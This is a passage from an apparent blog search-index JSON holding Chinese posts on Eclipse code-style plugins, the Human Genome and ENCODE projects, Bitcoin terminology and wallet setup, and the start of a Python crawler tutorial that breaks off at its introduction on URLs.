欢迎转载！","categories":[{"name":"信息检索","slug":"信息检索","permalink":"http://www.meng.uno/categories/信息检索/"}],"tags":[{"name":"搜索引擎","slug":"搜索引擎","permalink":"http://www.meng.uno/tags/搜索引擎/"},{"name":"Wiser","slug":"Wiser","permalink":"http://www.meng.uno/tags/Wiser/"},{"name":"倒排文件","slug":"倒排文件","permalink":"http://www.meng.uno/tags/倒排文件/"}]},{"title":"Eclipse的阿里巴巴代码规范配置","slug":"alibaba_style","date":"2018-03-01T15:25:33.000Z","updated":"2018-03-01T15:25:51.664Z","comments":true,"path":"articles/6e79ab7a/","link":"","permalink":"http://www.meng.uno/articles/6e79ab7a/","excerpt":"插件安装 环境：JDK1.8，Eclipse4+。有同学遇到过这样的情况，安装插件重启后，发现没有对应的菜单项，从日志上也看不到相关的异常信息，最后把JDK从1.6升级到1.8解决问题。 Help -> Install New Software… 输入Update Site地址：https://p3c.alibaba.com/plugin/eclipse/update 回车，然后勾选Ali-CodeAnalysis，再一直点Next Next…按提示走下去就好。 然后就是提示重启了，安装完毕。 注意：有同学反映插件扫描会触发很多 “JPA Java Change Event Ha","text":"插件安装 环境：JDK1.8，Eclipse4+。有同学遇到过这样的情况，安装插件重启后，发现没有对应的菜单项，从日志上也看不到相关的异常信息，最后把JDK从1.6升级到1.8解决问题。 Help -&gt; Install New Software… 输入Update Site地址：https://p3c.alibaba.com/plugin/eclipse/update 回车，然后勾选Ali-CodeAnalysis，再一直点Next Next…按提示走下去就好。 然后就是提示重启了，安装完毕。 注意：有同学反映插件扫描会触发很多 “JPA Java Change Event Handler (Waiting)” 的任务，这个是Eclipse的一个bug，因为插件在扫描的时候会对文件进行标记，所以触发了JPA的任务。卸载JPA插件，或者尝试升级到最新版的Eclipse。附：JPA project Change Event Handler问题解决 插件使用 目前插件实现了开发手册中的53条规则，大部分基于PMD实现，其中有4条规则基于Eclipse实现，支持4条规则的QuickFix功能。 * 所有的覆写方法，必须加@Override注解， * if/for/while/switch/do等保留字与左右括号之间都必须加空格, * long或者Long初始赋值时，必须使用大写的L，不能是小写的l） * Object的equals方法容易抛空指针异常，应使用常量或确定有值的对象来调用equals。 目前不支持代码实时检测，需要手动触发，希望更多的人加入进来一起把咱们的插件做得越来越好，尽量提升研发的使用体验。 代码扫描 可以通过右键菜单、Toolbar按钮两种方式手动触发代码检测。同时结果面板中可以对部分实现了QuickFix功能的规则进行快速修复。 触发扫描 在当前编辑的文件中点击右键，可以在弹出的菜单中触发对该文件的检测。 在左侧的Project目录树种点击右键，可以触发对整个工程或者选择的某个目录、文件进行检测。 也可以通过Toolbar中的按钮来触发检测，目前Toolbar的按钮触发的检测范围与您IDE当时的焦点有关，如当前编辑的文件或者是Project目录树选中的项，是不是感觉与右键菜单的检测范围类似呢。 扫描结果 简洁的结果面板，按规则等级分类，等级-&gt;规则-&gt;文件-&gt;违规项。同时还提供一个查看规则详情的界面。 清除结果标记更方便，支持上面提到的4条规则QuickFix。 查看所有规则 国际化 本文链接： http://www.meng.uno/articles/6e79ab7a/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"代码规范","slug":"Java开发Tips/代码规范","permalink":"http://www.meng.uno/categories/Java开发Tips/代码规范/"}],"tags":[{"name":"代码规范","slug":"代码规范","permalink":"http://www.meng.uno/tags/代码规范/"},{"name":"Alibaba Format","slug":"Alibaba-Format","permalink":"http://www.meng.uno/tags/Alibaba-Format/"},{"name":"Eclipse","slug":"Eclipse","permalink":"http://www.meng.uno/tags/Eclipse/"}]},{"title":"Eclipse的Google样式Java代码自动规范配置","slug":"google-format","date":"2018-03-01T12:59:33.000Z","updated":"2018-03-01T15:24:23.946Z","comments":true,"path":"articles/548d5dfd/","link":"","permalink":"http://www.meng.uno/articles/548d5dfd/","excerpt":"不知道大家在用Eclipse的时候有没有感觉到，当代码量一大就看不懂自己代码了呢？有人可能要说了，eclipse不是自己带有格式化代码工具吗？确实如此，但是我们可能想使用更高级的自动化工具，例如Google—Java-Style。这篇博文，我将展示如何使用eclipse自带的自动化代码规范工具，以及怎么配置Google-Java-Style。 准备 文件下载： * Eclipse: 进入官网 * Google Java Format File: 点击下载 使用Eclipse自带 * 快捷键： Ctrl/Command + Shift + F * 鼠标： * 单个文件：进入文件/","text":"不知道大家在用Eclipse的时候有没有感觉到，当代码量一大就看不懂自己代码了呢？有人可能要说了，eclipse不是自己带有格式化代码工具吗？确实如此，但是我们可能想使用更高级的自动化工具，例如Google—Java-Style。这篇博文，我将展示如何使用eclipse自带的自动化代码规范工具，以及怎么配置Google-Java-Style。 准备 文件下载： Eclipse: 进入官网 Google Java Format File: 点击下载 使用Eclipse自带 快捷键： Ctrl/Command + Shift + F 鼠标： 单个文件：进入文件/对着文件名点右键 &gt; 找到Source &gt; 点击Format (其实就是快捷键的作用！) 项目：对着项目名/包名点右键 &gt; 找到Source &gt; 点击Format 如下截图： 更换成Google Style 当我们下载了本博客提供的eclipse-java-google-style.xml，就可以开始为formatter改风格了。 打开eclipse的Preferences找到Java，再展开Code Style，找到Formatter。 点击Import，在弹出窗口里选择我们下载的文件，确定即可。 再次进入项目，对着想要格式化的对象进行格式化操作，在进度条走完，我们就得到一份Google Java Style的代码了。 后记 按照相似的步骤，我们也可以Import其他风格的代码规范； Google不仅提供了eclipse上Java的代码规范，还有其他很多规范，详见Goole Style Guile 如果任何代码规范都不和心意，也可以打开某个代码规范，自己做相应的改动。 本文链接： http://www.meng.uno/articles/548d5dfd/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"},{"name":"代码规范","slug":"Java开发Tips/代码规范","permalink":"http://www.meng.uno/categories/Java开发Tips/代码规范/"}],"tags":[{"name":"代码规范","slug":"代码规范","permalink":"http://www.meng.uno/tags/代码规范/"},{"name":"Eclipse","slug":"Eclipse","permalink":"http://www.meng.uno/tags/Eclipse/"},{"name":"Google Format","slug":"Google-Format","permalink":"http://www.meng.uno/tags/Google-Format/"}]},{"title":"What are Human Genome Project and ENCODE Project?","slug":"genome","date":"2018-02-18T11:54:31.000Z","updated":"2018-02-18T13:25:50.293Z","comments":true,"path":"articles/32469d52/","link":"","permalink":"http://www.meng.uno/articles/32469d52/","excerpt":"Human Genome Project The Profile of the Project 人类基因组计划(Human Genome Project,简称HGP)是由美国科学家于1985年率先提出，又于1990年正式启动的。来自美国、英国、法国、德国、日本和中国科学家共同参与了这一预算达30亿美元的人类基因组计划。按照这个计划的设想，在2005年，要把人体内约10万个基因的密码全部解开，同时绘制出人类基因的谱图。换句话说，就是要揭开组成人体4万个基因的30亿个碱基对的秘密。 这一计划的最终目的是测定人类基因组30亿个基本化学组成（称为碱基对或核苷酸），进而揭开与人类的生老病死有关的数万个","text":"Human Genome Project The Profile of the Project 人类基因组计划(Human Genome Project,简称HGP)是由美国科学家于1985年率先提出，又于1990年正式启动的。来自美国、英国、法国、德国、日本和中国科学家共同参与了这一预算达30亿美元的人类基因组计划。按照这个计划的设想，在2005年，要把人体内约10万个基因的密码全部解开，同时绘制出人类基因的谱图。换句话说，就是要揭开组成人体4万个基因的30亿个碱基对的秘密。 这一计划的最终目的是测定人类基因组30亿个基本化学组成（称为碱基对或核苷酸），进而揭开与人类的生老病死有关的数万个基因的相互关系。1984年，美国能源部开会，开始酝酿“人类基因组计划”。1989年，美国能源部和美国国家卫生研究所提出了人类基因图谱工程。美国在1990年10月1日率先启动人类基因组计划。美国人类基因组顾问委员会委员梅纳德•奥尔森是人类基因组计划最早的推动者之一，另外美国一个测序中心的主任罗伯特•沃特斯顿以及英国的人类基因组总负责人均表示支持。美国完成人类基因组计划近54%的工作量，为人类基因组计划最大的贡献国。英国是人类基因组计划的第二大贡献国，共34%的贡献都是由Wellcome基金会资助的Sanger中心完成的。日本、法国、德国对人类基因组计划的贡献分别为6.8%、2.8%与2.2%。中国承担了3号染色体区域短臂端粒侧约30 cM，约占人类整个基因组1% 的测序工作。中国的华大基因、国家自然科学基金会、中科院遗传所南方基因中心、北方人类基因组中心等单位及于军、杨焕明、汪建、刘斯奇、吴旻、强伯勤、陈竺等也给予人类基因组计划大力的推动。 The Importance of the Project 目的 人类是在“进化”历程上最高级的生物，对人类基因的研究有助于认识自身、掌握生老病死规律、疾病的诊断和治疗、了解生命的起源。 测出人类基因组DNA的30亿个碱基对的序列，发现所有人类基因，找出它们在染色体上的位置，破译人类全部遗传信息。 在人类基因组计划中，还包括对五种生物基因组的研究：大肠杆菌、酵母、线虫、果蝇和小鼠，称之为人类的五种“模式生物”。 HGP的目的是解码生命、了解生命的起源、了解生命体生长发育的规律、认识种属之间和个体之间存在差异的起因、认识疾病产生的机制以及长寿与衰老等生命现象、为疾病的诊治提供科学依据。 意义 人类基因组计划是一项规模宏大，跨国跨学科的科学探索工程。其宗旨在于测定组成人类染色体(指单倍体)中所包含的30亿个碱基对组成的核苷酸序列，从而绘制人类基因组图谱，并且辨识其载有的基因及其序列，达到破译人类遗传信息的最终目的。基因组计划是人类为了探索自身的奥秘所迈出的重要一步。 “人类基因组计划”与”曼哈顿原子弹计划”和”阿波罗计划”并称为二十世纪三大科学计划。 The Achievement of the Project 2000年6月26日，美国总统克林顿与英国首相布莱尔共同宣布人类基因组计划工作草图完成；次年2月，工作草图的具体序列信息、测序所采用的方法以及序列的分析结果被国际人类基因组测序联盟和塞雷拉基因组的科学家分别公开发表于《自然》与《科学》杂志。这一工作草图覆盖了基因组序列的83％，包括常染色质区域的90％（带有150,000个空缺，且许多片断的顺序和方位并没有得到确定）。 2001年2月12日，美国Celera公司与人类基因组计划分别在《科学》和《自然》杂志上公布了人类基因组精细图谱及其初步分析结果。 2003年，发现了新的方法通过检测另外的库来关闭Gaps。使用FISH技术或其他方法来分析没有闭合的Gaps大小。22，21条染色体就是用这种方式。 1999年至2006年，完成了全部23条染色体的测序工作，具体如下： 1999年12月，22号染色体测序完成； 2000年5月，21号染色体测序完成； 2001年12月，20号染色体测序完成； 2003年2月，14号染色体测序完成； 2003年6月，男性特有的Y染色体测序完成； 2003年5月和7月，7号染色体测序完成； 2003年10月，6号染色体测序完成； 2004年4月，13号和19号染色体测序完成； 2004年5月，9号和10号染色体测序完成； 2004年9月，5号染色体测序完成； 2004年12月，16号染色体测序完成； 2005年3月，X染色体测序完成； 2005年4月，2号和4号染色体测序完成； 2005年9月，18号染色体测序完成； 2006年1月，8号染色体测序完成； 2006年3月，11号,12号和15号染色体测序完成； 2006年4月，17号和3号染色体测序完成；Human Genome Project Information 2006年5月，1号染色体测序完成；Human Genome Project Information 2004年，国际人类基因组测序联盟的研究者宣布，人类基因组中所含基因的预计数目从先前的30,000至40,000（在计划初期的预计数目则高达2,000,000）调整为20,000至25,000。预期还需要多年的时间来确定人类基因组中所含基因的精确数目。 截止到2005年，人类基因组计划的测序工作已经完成。 The Research Contents of the Project 遗传图谱 遗传图谱又称连锁图谱（linkage map），它是以具有遗传多态性（在一个遗传位点上具有一个以上的等位基因，在群体中的出现频率皆高于1%）的遗传标记为“路标”，以遗传学距离（在减数分裂事件中两个位点之间进行交换、重组的百分率，1%的重组率称为1cM）为图距的基因组图。遗传图谱的建立为基因识别和完成基因定位创造了条件。意义：6000多个遗传标记已经能够把人的基因组分成6000多个区域，使得连锁分析法可以找到某一致病的或表现型的基因与某一标记邻近（紧密连锁）的证据，这样可把这一基因定位于这一已知区域，再对基因进行分离和研究。对于疾病而言，找基因和分析基因是个关键。 物理图谱 物理图谱是指有关构成基因组的全部基因的排列和间距的信息，它是通过对构成基因组的DNA分子进行测定而绘制的。绘制物理图谱的目的是把有关基因的遗传信息及其在每条染色体上的相对位置线性而系统地排列出来。DNA物理图谱是指DNA链的限制性酶切片段的排列顺序，即酶切片段在DNA链上的定位。因限制性内切酶在DNA链上的切口是以特异序列为基础的，核苷酸序列不同的DNA，经酶切后就会产生不同长度的DNA片段，由此而构成独特的酶切图谱。因此，DNA物理图谱是DNA分子结构的特征之一。DNA是很大的分子，由限制酶产生的用于测序反应的DNA片段只是其中的极小部分，这些片段在DNA链中所处的位置关系是应该首先解决的问题，故DNA物理图谱是顺序测定的基础，也可理解为指导DNA测序的蓝图。广义地说，DNA测序从物理图谱制作开始，它是测序工作的第一步。制作DNA物理图谱的方法有多种，这里选择一种常用的简便方法──标记片段的部分酶解法，来说明图谱制作原理。 序列图谱 随着遗传图谱和物理图谱的完成，测序就成为重中之重的工作。DNA序列分析技术是一个包括制备DNA片段化及碱基分析、DNA信息翻译的多阶段的过程。通过测序得到基因组的序列图谱。 基因图谱 简介 基因图谱是在识别基因组所包含的蛋白质编码序列的基础上绘制的结合有关基因序列、位置及表达模式等信息的图谱。在人类基因组中鉴别出占具2%~5%长度的全部基因的位置、结构与功能，最主要的方法是通过基因的表达产物mRNA反追到染色体的位置。 意义 它能有效地反应在正常或受控条件中表达的全基因的时空图。通过这张图可以了解某一基因在不同时间不同组织、不同水平的表达；也可以了解一种组织中不同时间、不同基因中不同水平的表达，还可以了解某一特定时间、不同组织中的不同基因不同水平的表达。人类基因组是一个国际合作项目：表征人类基因组，选择的模式生物的DNA测序和作图，发展基因组研究的新技术，完善人类基因组研究涉及的伦理、法律和社会问题，培训能利用HGP发展起来的这些技术和资源进行生物学研究的科学家，促进人类健康。 The Contributions of the Project 对人类疾病的贡献 人类疾病相关的基因是人类基因组中结构和功能完整性至关重要的信息。对于单基因病，采用“定位克隆”和“定位候选克隆”的全新思路，导致了亨廷顿氏舞蹈症、遗传性结肠癌和乳腺癌等一大批单基因遗传病致病基因的发现，为这些疾病的基因诊断和基因治疗奠定了基础。对于心血管疾病、肿瘤、糖尿病、神经精神类疾病（老年性痴呆、精神分裂症）、自身免疫性疾病等多基因疾病是疾病基因研究的重点。健康相关研究是HGP的重要组成部分，1997年相继提出：“肿瘤基因组解剖计划”“环境基因组学计划”。 对医学的贡献 基因诊断、基因治疗和基于基因组知识的治疗、基于基因组信息的疾病预防、疾病易感基因的识别、风险人群生活方式、环境因子的干预。 对生物技术的贡献 基因工程药物 分泌蛋白（多肽激素，生长因子，趋化因子，凝血和抗凝血因子等）及其受体。 诊断和研究试剂 基因和抗体试剂盒、诊断和研究用生物芯片、疾病和筛药模型。 细胞工程 胚胎和成年期干细胞、克隆技术、器官再造技术。 The Project with China 作为继美、英、法、德、日6个成员国之后中唯一的发展中国家，中国对人类基因组的的贡献不只是工作量，在这个划时代的里程碑上，已经刻上了中国人的名字，中国在生物组学的发展上占有一席之地，通过参与这一计划，我们可以分享数据、资源、技术与发言权，最终来开发我国自己的基因资源。中国的加入改变了国际人类基因组计划原有的组织格局，提高其国际合作的形象，带来了国际社会对“国际人类基因组计划精神”的支持，联合国教科文组织关于人类基因组基本信息免费共享的声明，就是在中国代表的直接努力下促成的。可以说，中国需要人类基因组计划，而基因组计划也使我国的基因测序能力进人世界前列，在中国本土成长起来的作为我国基因组学的典型代表、创新型机构——华大基因已经成为全球最大的基因组学中心。 因此，人类基因组计划对华大基因的影响力也是举足轻重的，华大基因也因此而“生”的伟大。华大基因随着“国际人类基因组计划1%项目”的正式启动而诞生。华大基因自成立之日起就站在世界同步的轨迹上，使得中国的基因组学研究位于跟踪——参与——同步的国际地位。为后期的华大基因在基因组上的引领及跨越式发展奠定了基础。 在人类基因组计划之后，人类基因研究开始朝着与人类生育健康、肿瘤个体化治疗、病原微生物、遗传性疾病、血液病等的相关疾病的基因检测方向发展，未来，医疗技术将从末端的疾病治疗，逐步走向前端的基因诊断和预防，个性化医疗及精准医疗。人类将通过基因检测技术、通过个性化医疗以更精确的诊断，预测潜在疾病的风险，提供更有效、更有针对性的治疗，预防某种疾病的发生，比“治有病”更节约治疗成本。 华大基因希望凭借全球领先的基因组学技术，华大基因将千万家庭远离遗传性出生缺陷，肿瘤能早期检测和诊断并能全景式、定期监控个人健康动态，人人做到“我的基因我知道，我的健康我做主”。其研究方向主要涉及遗传性出生缺陷、肿瘤、心脑血管疾病、精准医疗 # The ENCODE Project The Profile of the Project The ENCODE Project（即Encyclopedia Of DNA Elements，中文译作DNA元件百科全书计划），是美国国立人类基因组研究院（US National Human Genome Research Institute，NHGRI）在2003年9月启动的跨国研究项目。该项目旨在解析人类基因组中的所有功能性元件，它是人类基因组计划完成之后，又一重要的跨国基因组学研究项目。该项目联合了来自美国，英国，西班牙，新加坡和日本的32个实验室的422名科学家的努力，获得了迄今最详细的人类基因组分析数据（他们获得并分析了超过15兆兆字节的原始数据）。研究花费了约300年的计算机时间，对147个组织类型进行了分析，以确定哪些能打开和关闭特定的基因，以及不同类型细胞之间的“开关”存在什么差异。 The Achievement of the Project 近年来基因研究已经取得巨大进展。不过，迄今为止，这些研究主要还集中在编码蛋白的特定基因上，而它们所佔的比例不到整个人类基因组的2%。ENCODE计划首次系统地研究了所有类型的功能元件的位点和组织方式。 迄今为止，ENCODE计划主要集中研究了44个靶标共3000万个DNA硷基对。负责该计划数据整合和分析工作的欧洲分子生物学实验室主任Ewan Birney说：“我们的结论揭示了有关DNA功能元件构成的重要原理，为从DNA转录到哺乳动物进化的一切过程提供了新的认识。” 研究发现，人类基因组中的大多数DNA都会转录成RNA，这些副本会普遍交叠。因此，人类基因组实际上是一个非常复杂的网络，所谓的无用基因实际上非常少。基因只不过是众多具有特定功能的DNA序列类型之一。科学家们在基因之外的调控区域新发现了4491个转录启动位点，这一数字超过了已知基因的10倍。这些都挑战了长期以来的一个观点，即基因组中的基因是孤立的，同时，新的发现也支持了人类基因数量应该超过3万个的看法。 ENCODE计划的另一个巨大成就就是对哺乳动物基因组进化的认识。传统理论认为，与生理功能相关的重要DNA序列往往位于基因组中的“进化限制”区域，它们在物种进化过程中更容易保存下来。但是，最新的研究表明，大约一半人类基因组中的功能元件在进化过程中不会受到很大限制。科学家认为，哺乳动物缺乏“进化限制”这一点，很可能意味著许多物种的基因组都囊括了大量包括RNA转录副本在内的功能元件，在进化过程中，这些功能元件成了基因“仓库”。 此次ENCODE计划的成果亮点还包括：确定了许多之前不为人知的DNA转录启动位点；推翻了传统观点的认识，调控区域也有可能位于DNA转录启动位点的下游；确定了组蛋白变化的特定标记；加深了人们对组蛋白改变协调DNA复制的理解。 2012年9月5日，ENCODE项目的阶段性研究结果被整理成30篇论文发表于《自然》（6篇），《基因组研究》（6篇）和《基因组生物学》（18篇）上。 研究结果显示，人类基因组内的非编码DNA至少80%是有生物活性的，而并非之前认为的“垃圾” DNA （junk DNA）。这些新的发现有望帮助研究人员理解基因受到控制的途径，以及澄清某些疾病的遗传学风险因子。 ENCODE是人类基因组计划之后国际科学界在基因组学研究领域取得的又一重大进展。 2012年12月21日，ENCODE项目被《科学》杂志评为本年度十大科学突破之一。 The Research Contents of the Project 试点研究的内容 对编码的功能DNA进行鉴定和分类；对已存在的几种方法进行测试和比较，严格分析了人类基因组序列中已被定义的序列。 阐明人类生物学和疾病之间的关系。 对大量鉴定基因特征的方法、技术和手段进行检测和评估。 研究对象 编码蛋白基因 非编码蛋白基因 调控区域 染色体结构维持和调节染色体复制能力的DNA元件 研究特点 采用综合性研究策略 重视新技术的研发 将计划向学术界和公司开放 The Contributions of the Project 人细胞转录全景图 通过ENCODE项目，人们知道RNA是基因组编码的遗传信息的直接输出。细胞的大部分调节功能都集中在RNA的合成、加工和运输、修饰和翻译之中。研究人员证实，75%的人基因组能够发生转录，并且观察到几乎所有当前已标注的RNA和上千个之前未标注的RNA的表达范围与水平、定位、加工命运、调节区和修饰。总之，这些观察结果表明人们需要重新定义基因的概念。 人基因组中可访问的染色质全景图 DNase I超敏感位点(DNase I hypersensitive sites, DHSs)是调节性DNA序列的标记物。研究人员通过对125个不同的细胞和组织类型进行全基因组谱分析而鉴定出大约290万个人DHSs，并且首次大范围地绘制出人DHSs图谱。 基因启动子的远距离相互作用全景图 在ENCODE项目中，研究人员选择1%的基因组作为项目试点区域，并且利用染色体构象捕获碳拷贝(chromosome conformation capture carbon copy, 简称为5C)技术来综合性地分析了这个区域中转录起始位点和远端序列元件之间的相互作用。他们获得GM12878、K562和HeLa-S3细胞的5C图谱。在每个细胞系，他们发现启动子和远端序列元件之间存在1000多个远距离相互作用。 GENCODE：ENCODE项目的人基因组参照标注 GENCODE项目旨在利用计算分析、人工标注和实验验证来鉴定出人基因组中所有的基因特征。GENCODE第七版(GENCODE v7)公开发布了基因组标注数据集，包含了20687个蛋白编码的RNA基因座位、9640个长链非编码RNA基因座位，并且拥有33977个在UCSC基因数据库和RefSeq数据库中不存在的编码性转录本。它还对公开获得的长链非编码RNA(long noncoding RNA, lncRNA)进行最全面的标注。 我的认识 在上这门课之前，我从没认真想过这个问题，到底研究基因有什么用？通过这几天的学习，以及对文章所提的两个项目的检索、认识，我对基因测序这一工作，有了更深层次的认识。 虽然外界关于基因测序有不同的看法，例如有人支持，因为它可以为医学做贡献；有人反对，因为这样做相当于为基因做了一次曝光，这样一来，就有优劣基因之分。在我看来，这一任务还是利大于弊的，毕竟现在看来是这样。科学家可以通过对已有的基因测序结果的分析，总结出基因的“中心法则”，使我们对自身有了更进一步的了解。再者，基因分析有很多好的应用，通过对胎儿基因分析可以达到优生的目的，以及对有基因缺陷、先天性遗传病患者可以提供治标治本的治疗方案。 当然，要了解所有基因的功能还有很长的一段路要走。例如以前人们所认为的垃圾DNA实际上并不“垃圾”，它们在基因组的进化、每个个体的差异性以及许多其他方面扮演着重要角色，是世界上许多实验室着力研究的目标。 即使已经过了将近30年，人类基因组也没有完成“完全”测序，不过我们了解到了基因并不是静态的，而是处在复杂的变化之中，所以对人类基因的研究也是对人类自身的研究，这一研究将会一直进行下去，永无终点。 虽然人类基因组目前也只是一张初步的蓝图，需要经过更多的研究和分析。但是人类已经通过对基因组的学习，进入了医学的新纪元，为预防、诊断和治疗疾病带来了新的方法。所以对基因组的研究势必将成为人类新的曙光。 总之，我对基因组计划以及ENCODE计划充满期待与支持。 参考资料 HGP计划百度百科：http://dwz.cn/3ITVf3 人类基因组计划- 维基百科http://dwz.cn/3JHOap 科学松鼠会之人类基因组计划 http://dwz.cn/3JHOXZ ENCODE项目百度百科：http://dwz.cn/3ITSPr Genome网 https://www.genome.gov/10005107/encode-project ENCODE项目官网：https://www.encodeproject.org “DNA元件百科全书”首批成果出炉，链接：http://big5.cas.cn/xw/kjsm/gjdt/200706/t20070619_1011212.shtml 本文链接： http://www.meng.uno/articles/32469d52/ 欢迎转载！","categories":[{"name":"生物信息","slug":"生物信息","permalink":"http://www.meng.uno/categories/生物信息/"}],"tags":[{"name":"生物信息","slug":"生物信息","permalink":"http://www.meng.uno/tags/生物信息/"},{"name":"Genome","slug":"Genome","permalink":"http://www.meng.uno/tags/Genome/"},{"name":"ENCODE","slug":"ENCODE","permalink":"http://www.meng.uno/tags/ENCODE/"}]},{"title":"关于比特币（Bitcoin）","slug":"bitcoins","date":"2018-02-14T11:47:44.000Z","updated":"2018-02-14T12:14:20.810Z","comments":true,"path":"articles/7bfe1542/","link":"","permalink":"http://www.meng.uno/articles/7bfe1542/","excerpt":"比特币术语 比特币 首字母大写的Bitcoin用来表示比特币的概念或整个比特币网络本身。例如：“今天我学了些有关Bitcoin协议的内容。” 而没有大写的bitcoin则表示一个记账单位。例如：“我今天转出了10个bitcoin。”该单位通常也简写为BTC或XBT。 比特币地址 比特币地址就像一个物理地址或者电子邮件地址。这是别人付给你比特币时你唯一需要提供的信息。然而一个重要的区别是，每个地址应该只用于单笔交易。 对等式网络 对等式网络是指，通过允许单个节点与其他节点直接交互，从而实现整个系统像有组织的集体一样运作的系统 。对于比特币来说，比特币网络以这样一种方式构建——每个用户都在传","text":"比特币术语 比特币 首字母大写的Bitcoin用来表示比特币的概念或整个比特币网络本身。例如：“今天我学了些有关Bitcoin协议的内容。” 而没有大写的bitcoin则表示一个记账单位。例如：“我今天转出了10个bitcoin。”该单位通常也简写为BTC或XBT。 比特币地址 比特币地址就像一个物理地址或者电子邮件地址。这是别人付给你比特币时你唯一需要提供的信息。然而一个重要的区别是，每个地址应该只用于单笔交易。 对等式网络 对等式网络是指，通过允许单个节点与其他节点直接交互，从而实现整个系统像有组织的集体一样运作的系统 。对于比特币来说，比特币网络以这样一种方式构建——每个用户都在传播其他用户的交易。而且重要的是，不需要银行作为第三方。 哈希率 哈希率是衡量比特币网络处理能力的测量单位。为保证安全，比特币网络必须进行大量的数学运算。当网络达到10Th/秒的哈希率时，就意味着它能够进行每秒10万亿次的计算。 交易确认 交易确认意味着一笔交易已经被网络处理且不太可能被撤销。当交易被包含进一个块时会收到一个确认，后续的每一个块都对应一个确认。对于小金额交易单个确认便可视为安全，然而对于比如1000美元的大金额交易，等待6个以上的确认比较合理。每一个确认都成指数级地降低交易撤销的风险。 块链 块链是一个按时间顺序排列的比特币交易公共记录。块链由所有比特币用户共享。它被用来验证比特币交易的永久性并防止双重消费。 密码学 密码学是数学的一个分支，它让我们创造出可以提供很高安全性的数学证明。电子商务和网上银行也用到了密码学。对于比特币来说，密码学用来保证任何人都不可能使用他人钱包里的资金，或者破坏块链。密码学也用来给钱包加密，这样没有密码就用不了钱包。 签名 密码学签名是一个让人可以证明所有权的数学机制。对于比特币来说，一个比特币钱包和它的私钥通过一些数学魔法关联到一起。当你的比特币软件用对应的私钥为一笔交易签名，整个网络都能知道这个签名和已花费的比特币相匹配。但是，世界上没有人可以猜到你的私钥来窃取你辛苦赚来的比特币。 钱包 比特币钱包大致实体钱包在比特币网络中的等同物。钱包中实际上包含了你的私钥，可以让你消费块链中分配给钱包的比特币。和真正的钱包一样，每个比特币钱包都可以显示它所控制的所有比特币的总余额，并允许你将一定金额的比特币付给某人。这与商家进行扣款的信用卡不同。 区块 一个块是块链中的一条记录，包含并确认待处理的交易。平均约每10分钟就有一个包含交易的新块通过挖矿的方式添加到块链中。 双重消费 如果一个不怀好意的用户试图将比特币同时支付给两个不同的收款人，就被称为双重消费。比特币挖矿和块链将就两比交易中那笔获得确认并被视为有效在网络上达成一致。 私钥 私钥是一个证明你有权从一个特定的钱包消费比特币的保密数据块，是通过一个密码学签名来实现的 。如果你使用的是钱包软件，你的私钥就存储在你的计算机内；如果使用的是在线钱包，你的私钥就存储在远程服务器上。千万不能泄露私钥，因为它们可以让你消费对应比特币钱包里的比特币。 挖矿 比特币挖矿是利用计算机硬件为比特币网络做数学计算进行交易确认和提高安全性的过程。作为对他们服务的奖励，矿工可以得到他们所确认的交易中包含的手续费，以及新创建的比特币。挖矿是一个专业的、竞争激烈的市场，奖金按照完成的计算量分割。并非所有的比特币用户都挖矿，挖矿赚钱也并不容易。 Bit Bit是标明一个比特币的次级单位的常用单位 -1,000,000 bit 等于1 比特币 (BTC 或 B⃦).，这个单位对于标示小费、商品和服务价格更方便。 BTC BTC 是用于标示一个比特币 (B⃦). 的常用单位。 比特币账户 我们可以在bitcoin.org上选择自己的钱包。我在这里向大家展示使用一个浏览器插件GreenAddress，下载链接是：https://chrome.google.com/webstore/detail/greenaddress/dgbimgjoijjemhdamicmljbncacfndmp/related 注册 打开安装好的GreenAddress，没有账户点击右上角，开始注册。 打码的位置请保存下来，应该需要用它来登录 接着是验证你保存没保存（想的还很周到）。 再就是添加两步验证，这个比较常见了，我只选了“邮件”验证，推荐是选两个，要不然总是有warning。 使用 接着就进入主界面了，有很多配置需要大家自己去查看，主界面显示了你的“Bitcoin URI”，分享这个，别人就可以向你转钱了，应该。 最后强调一下，我的比特币地址是：3CEzyZnpij4WnrAsHhhcaoD1Kf5JqSAEGj 本文链接： http://www.meng.uno/articles/7bfe1542/ 欢迎转载！","categories":[],"tags":[{"name":"比特币","slug":"比特币","permalink":"http://www.meng.uno/tags/比特币/"},{"name":"Bitcoin","slug":"Bitcoin","permalink":"http://www.meng.uno/tags/Bitcoin/"}]},{"title":"简单的Python3爬虫","slug":"crawl-py","date":"2018-02-12T12:18:15.000Z","updated":"2018-02-13T14:08:54.149Z","comments":true,"path":"articles/51d32f19/","link":"","permalink":"http://www.meng.uno/articles/51d32f19/","excerpt":"我们先从分析原理入手，然后再使用Python提供的基本的库urllib。 注意，我全程使用的是Python3，如果你必须使用不同版本，请自行百度某些库及函数的转换，需要使用的库不一定你的电脑上预装了，所以请自行百度安装。 原理 网络爬虫，也叫网络蜘蛛(Web Spider)，如果把互联网比喻成一个蜘蛛网，Spider就是一只在网上爬来爬去的蜘蛛。网络爬虫就是根据网页的地址来寻找网页的，也就是URL。 URL URL就是统一资源定位符(Uniform Resource Locator)，它的一般格式如下(带方括号[]的为可选项)： protocol ://hostname[:port]/","text":"我们先从分析原理入手，然后再使用Python提供的基本的库urllib。 注意，我全程使用的是Python3，如果你必须使用不同版本，请自行百度某些库及函数的转换，需要使用的库不一定你的电脑上预装了，所以请自行百度安装。 原理 网络爬虫，也叫网络蜘蛛(Web Spider)，如果把互联网比喻成一个蜘蛛网，Spider就是一只在网上爬来爬去的蜘蛛。网络爬虫就是根据网页的地址来寻找网页的，也就是URL。 URL URL就是统一资源定位符(Uniform Resource Locator)，它的一般格式如下(带方括号[]的为可选项)： protocol ://hostname[:port]/path/[;parameters][?query]#fragment 可见，一个URL包含三个部分： protocol：协议，例如https，http等； hostname[:port]：主机名(端口号为可选参数)，一般网站默认的端口号为80，例如我的博客域名www.meng.uno，可以作为主机名使用; path：第三部分就是主机资源的具体地址，如目录和文件名等。 爬虫就是向URL发送请求，然后得到响应，基本就实现了爬取网页的功能。 URI可以分为URL,URN或同时具备locators 和names特性的一个东西。URN作用就好像一个人的名字，URL就像一个人的地址。换句话说：URN确定了东西的身份，URL提供了找到它的方式。 从浏览器发送和接收数据看起 